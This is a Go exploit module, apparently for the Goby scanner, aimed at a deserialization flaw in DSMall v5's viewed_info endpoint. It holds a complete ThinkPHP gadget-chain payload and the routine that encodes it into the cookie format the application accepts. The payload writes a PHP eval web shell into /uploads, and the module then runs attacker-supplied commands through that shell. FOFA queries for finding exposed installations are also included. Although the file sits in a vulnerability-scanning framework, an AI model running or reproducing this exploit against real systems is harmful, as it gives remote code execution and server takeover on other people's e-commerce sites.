package exploits

import (
	"crypto/md5"
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "DSMall system viewed_info method command execution vulnerability",
    "Description": "<p>DSMall is a multi-user online mall system developed by Changsha Deshang Network Technology Co., Ltd.</p><p>There is a deserialization vulnerability in the viewed_goods parameter of the viewed_info method of the v5 version of DSMall. An attacker can execute arbitrary code through the vulnerability and obtain server permissions.</p>",
    "Product": "DSMall",
    "Homepage": "http://www.csdeshang.com/",
    "DisclosureDate": "2020-05-17",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": "body=\"/static/plugins/js/dialog/dialog.js\\\" id=\\\"dialog_js\\\"\"",
    "GobyQuery": "body=\"/static/plugins/js/dialog/dialog.js\\\" id=\\\"dialog_js\\\"\"",
    "Level": "3",
    "Impact": "<p>There is a deserialization vulnerability in the viewed_goods parameter of the viewed_info method of the v5 version of DSMall. An attacker can execute arbitrary code through the vulnerability and obtain server permissions.</p>",
    "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version</p><p>2. Deploy a web application firewall to monitor file operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
    "References": [
        "https://www.anquanke.com/post/id/203461#h3-4"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "code",
            "type": "input",
            "value": "system('whoami');",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "OR",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH syntax error: '~",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "DSMall系统 viewed_info方法存在命令执行漏洞",
            "Product": "DSMall",
            "Description": "<p>DSMall是由长沙德尚网络科技有限公司<span style=\"color: rgb(62, 62, 62);\">开发的一款<span style=\"color: rgb(62, 62, 62);\">多用户在线商城系统。</span></span></p><p><font color=\"#3e3e3e\">DSMall的v5版本的viewed_info方法的<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">viewed_goods</span>参数存在反序列化漏洞，攻击者可以通过漏洞执行任意代码，获取服务器权限。</font><span style=\"color: rgb(62, 62, 62);\"><span style=\"color: rgb(62, 62, 62);\"><br></span></span></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户升级至最新版</p><p>2、部署Web应用防火墙，对文件操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(62, 62, 62); font-size: 16px;\">DSMall的v5版本的</span><span style=\"color: rgb(62, 62, 62); font-size: 16px;\">viewed_info方法</span><span style=\"color: rgb(62, 62, 62); font-size: 16px;\">的<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">viewed_goods</span><span style=\"color: rgb(62, 62, 62); font-size: 16px;\"></span>参数存在反序列化漏洞，攻击者可以通过漏洞执行任意代码，获取服务器权限。</span><br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "DSMall system viewed_info method command execution vulnerability",
            "Product": "DSMall",
            "Description": "<p>DSMall is a multi-user online mall system developed by Changsha Deshang Network Technology Co., Ltd.</p><p>There is a deserialization vulnerability in the <span style=\"color: rgb(22, 28, 37); font-size: 16px;\">viewed_goods</span> parameter of the&nbsp;viewed_info method of the v5 version of DSMall. An attacker can execute arbitrary code through the vulnerability and obtain server permissions.</p>",
            "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version</p><p>2. Deploy a web application firewall to monitor file operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37);\">There is a deserialization vulnerability in the viewed_goods parameter of the&nbsp;viewed_info&nbsp;method of the v5 version of DSMall. An attacker can execute arbitrary code through the vulnerability and obtain server permissions.</span><br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10699"
}`

	MD5123455 := func(str string) string {
		data := []byte(str) //切片
		has := md5.Sum(data)
		md5str := fmt.Sprintf("%x", has) //将[]byte转成16进制
		return md5str
	}

	//sha123455 := func(str string) string {
	//	data := []byte(str) //切片
	//	has := sha1.Sum(data)
	//	sha1str := fmt.Sprintf("%x", has) //将[]byte转成16进制
	//	return sha1str
	//}

	Substr123455 := func(str string, start, length int) string {
		rs := []rune(str)
		rl := len(rs)
		end := 0
		if start < 0 {
			start = rl - 1 + start
		}
		end = start + length
		if start > end {
			start, end = end, start
		}
		if start < 0 {
			start = 0
		}
		if start > rl {
			start = rl
		}
		if end < 0 {
			end = 0
		}
		if end > rl {
			end = rl
		}
		return string(rs[start:end])
	}

	encode123455 := func(data string, key_tmp string) string {
		key := key_tmp
		chars := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.";
		ikey := "-x6g6ZWm2G9g_vr0Bo.pOq3kRIxsZ6rm"
		nh1 := 0
		nh2 := 0
		nh3 := 0
		ch1 := "A"
		ch2 := "A"
		ch3 := "A"
		nhnum := nh1 + nh2 + nh3
		knum := 0
		for i:=0; i<len(key);i++{
			knum = knum + int(key[i])
		}
		mdkey := Substr123455(MD5123455(MD5123455(MD5123455(key+ch1)+ch2+ikey)+ch3),nhnum %8,knum % 8+16)
		str := "1234567890_"+data
		msg := []byte(str)
		encoded := base64.StdEncoding.EncodeToString(msg)
		encoded1 := strings.Replace(encoded, "+", "-", -1)
		encoded2 := strings.Replace(encoded1, "/", "_", -1)
		txt := strings.Replace(encoded2, "=", ".", -1)
		tmp := ""
		k := 0
		j := 0
		tlen := len(txt)
		klen := len(mdkey)
		for i:=0; i<tlen; i++{
			if k == klen{
				k = 0
			}
			findkey := ""
			findkey = fmt.Sprintf("%c",txt[i])
			j = (int(nhnum) + int(strings.Index(chars,findkey)) + int(mdkey[k])) % 64
			k = k + 1
			tmp += fmt.Sprintf("%c",chars[j])
		}
		tmplen := len(tmp)
		tmplen = tmplen + 1
		tmp = "A" + tmp
		tmplen = tmplen + 1
		tmp = "A" + tmp
		tmplen = tmplen + 1
		index := knum % tmplen
		tmp = tmp[:index] +"A" + tmp[index:]
		return tmp
	}

	unserialize123455 := func (u *httpclient.FixUrl,index string,poc string,payload string,file string) bool{
		uri1 := fmt.Sprintf("%s?s=home/index/viewed_info", index)
		cfg1 := httpclient.NewPostRequestConfig(uri1)
		cfg1.VerifyTls = false
		cfg1.FollowRedirect = false
		cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg1.Header.Store("Cookie", "viewed_goods="+poc)
		cfg1.Data = "img=if(!is_dir($_SERVER['DOCUMENT_ROOT'].'/uploads/')){mkdir($_SERVER['DOCUMENT_ROOT'].'/uploads',777,true);}file_put_contents($_SERVER['DOCUMENT_ROOT'].'/uploads/"+file+"',hex2bin('"+payload+"'));"
		if _, err := httpclient.DoHttpRequest(u, cfg1); err == nil{
			cfg := httpclient.NewGetRequestConfig("/uploads/"+file+"?img=echo+md5(123);")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp2, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(resp2.RawBody,"202cb962ac59075b964b07152d234b70") {
				return true
			}
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//<?php echo md5(123);unlink(__FILE__);?> 删除自身
			payload := "3c3f706870206563686f206d643528313233293b756e6c696e6b285f5f46494c455f5f293b3f3e"
			filename := "test" + goutils.RandomHexString(7) + ".php"
			//注册新用户，常规的注册和登录都是需要验证码的，这里存在一个不需要验证码的接口，并且注册成功会直接设置session，无需再次登陆
			key := "a2382918dbb49c8643f19bc3ab90ecf9"
			poc, _ := url.QueryUnescape("O%3A13%3A%22think%5CProcess%22%3A3%3A%7Bs%3A21%3A%22%00think%5CProcess%00status%22%3Bs%3A6%3A%22starte%22%3Bs%3A27%3A%22%00think%5CProcess%00processPipes%22%3BO%3A28%3A%22think%5Cmodel%5Crelation%5CHasMany%22%3A4%3A%7Bs%3A8%3A%22%00%2A%00query%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A29%3A%22think%5Csession%5Cdriver%5CMemcache%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A28%3A%22think%5Ccache%5Cdriver%5CMemcached%22%3A3%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A13%3A%22think%5CRequest%22%3A2%3A%7Bs%3A6%3A%22%00%2A%00get%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A74%3A%223c3f70687020406576616c28245f524551554553545b27696d67275d293b6578697428293b%22%3B%7Ds%3A9%3A%22%00%2A%00filter%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22hex2bin%22%3Bi%3A1%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22think%5Cview%5Cdriver%5CPhp%22%3A0%3A%7B%7Di%3A1%3Bs%3A7%3A%22display%22%3B%7D%7D%7Ds%3A10%3A%22%00%2A%00options%22%3Ba%3A1%3A%7Bs%3A6%3A%22prefix%22%3Bs%3A5%3A%22test%2F%22%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7Ds%3A9%3A%22%00%2A%00config%22%3Ba%3A2%3A%7Bs%3A6%3A%22expire%22%3Bs%3A0%3A%22%22%3Bs%3A12%3A%22session_name%22%3Bs%3A0%3A%22%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22where%22%3Bi%3A1%3Bs%3A16%3A%22removeWhereField%22%3B%7D%7Ds%3A13%3A%22%00%2A%00foreignKey%22%3Bs%3A3%3A%22abc%22%3Bs%3A9%3A%22%00%2A%00parent%22%3BO%3A10%3A%22think%5CView%22%3A1%3A%7Bs%3A6%3A%22engine%22%3Bs%3A3%3A%22111%22%3B%7Ds%3A11%3A%22%00%2A%00localKey%22%3Bs%3A6%3A%22engine%22%3B%7Ds%3A33%3A%22%00think%5CProcess%00processInformation%22%3Ba%3A1%3A%7Bs%3A7%3A%22running%22%3Bs%3A1%3A%221%22%3B%7D%7D")
			encode_poc := encode123455(poc,key)
			encode_poc = url.QueryEscape(encode_poc)
			status := unserialize123455(u,"/index.php",encode_poc,payload,filename)
			if status{
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// <?php @eval($_REQUEST['img']);if($_REQUEST['unlink']==1){unlink(__FILE__);}?> 删除自身
			payload := "3c3f70687020406576616c28245f524551554553545b27696d67275d293b696628245f524551554553545b27756e6c696e6b275d3d3d31297b756e6c696e6b285f5f46494c455f5f293b7d3f3e"
			code := url.QueryEscape(ss.Params["code"].(string))
			filename := "test" + goutils.RandomHexString(7) + ".php"
			cfg := httpclient.NewGetRequestConfig("/uploads/"+filename+"?unlink=1&img=" + code)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			key := "a2382918dbb49c8643f19bc3ab90ecf9"
			poc, _ := url.QueryUnescape("O%3A13%3A%22think%5CProcess%22%3A3%3A%7Bs%3A21%3A%22%00think%5CProcess%00status%22%3Bs%3A6%3A%22starte%22%3Bs%3A27%3A%22%00think%5CProcess%00processPipes%22%3BO%3A28%3A%22think%5Cmodel%5Crelation%5CHasMany%22%3A4%3A%7Bs%3A8%3A%22%00%2A%00query%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A29%3A%22think%5Csession%5Cdriver%5CMemcache%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A28%3A%22think%5Ccache%5Cdriver%5CMemcached%22%3A3%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A13%3A%22think%5CRequest%22%3A2%3A%7Bs%3A6%3A%22%00%2A%00get%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A74%3A%223c3f70687020406576616c28245f524551554553545b27696d67275d293b6578697428293b%22%3B%7Ds%3A9%3A%22%00%2A%00filter%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22hex2bin%22%3Bi%3A1%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22think%5Cview%5Cdriver%5CPhp%22%3A0%3A%7B%7Di%3A1%3Bs%3A7%3A%22display%22%3B%7D%7D%7Ds%3A10%3A%22%00%2A%00options%22%3Ba%3A1%3A%7Bs%3A6%3A%22prefix%22%3Bs%3A5%3A%22test%2F%22%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7Ds%3A9%3A%22%00%2A%00config%22%3Ba%3A2%3A%7Bs%3A6%3A%22expire%22%3Bs%3A0%3A%22%22%3Bs%3A12%3A%22session_name%22%3Bs%3A0%3A%22%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22where%22%3Bi%3A1%3Bs%3A16%3A%22removeWhereField%22%3B%7D%7Ds%3A13%3A%22%00%2A%00foreignKey%22%3Bs%3A3%3A%22abc%22%3Bs%3A9%3A%22%00%2A%00parent%22%3BO%3A10%3A%22think%5CView%22%3A1%3A%7Bs%3A6%3A%22engine%22%3Bs%3A3%3A%22111%22%3B%7Ds%3A11%3A%22%00%2A%00localKey%22%3Bs%3A6%3A%22engine%22%3B%7Ds%3A33%3A%22%00think%5CProcess%00processInformation%22%3Ba%3A1%3A%7Bs%3A7%3A%22running%22%3Bs%3A1%3A%221%22%3B%7D%7D")
			encode_poc := encode123455(poc,key)
			encode_poc = url.QueryEscape(encode_poc)
			status := unserialize123455(expResult.HostInfo,"/index.php",encode_poc,payload,filename)
			if status{
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				}
			}
			return expResult
		},
	))
}